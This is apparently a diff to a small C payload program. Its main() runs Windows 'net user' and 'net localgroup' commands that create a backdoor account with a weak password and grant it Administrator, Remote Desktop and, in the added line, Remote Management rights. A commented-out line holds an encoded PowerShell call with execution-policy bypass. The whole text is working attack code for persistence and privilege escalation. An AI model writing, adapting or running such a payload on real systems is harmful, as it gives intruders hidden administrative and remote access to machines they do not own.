@@ -10,6 +10,7 @@ int main() {
 	i = system("net user added_user password /add");
 	i = system("net localgroup Administrators added_user /add");
 	i = system("net localgroup \"Remote Desktop Users\" added_user /add");
+	i = system("net localgroup \"Remote Management Users\" added_user /add");
 	/*i = system("powershell.exe -ep bypass -NoP -EncodedCommand <encoded-command>");*/
 
 	return 0;
